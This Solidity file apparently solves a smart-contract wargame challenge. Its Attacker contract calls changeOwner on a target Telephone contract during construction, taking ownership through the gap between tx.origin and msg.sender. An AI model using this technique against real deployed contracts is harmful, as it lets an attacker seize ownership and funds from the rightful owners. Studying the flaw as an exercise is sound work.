// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attacker is Telephone {
    constructor(address _target) {
        Telephone(_target).changeOwner(msg.sender);
    }
}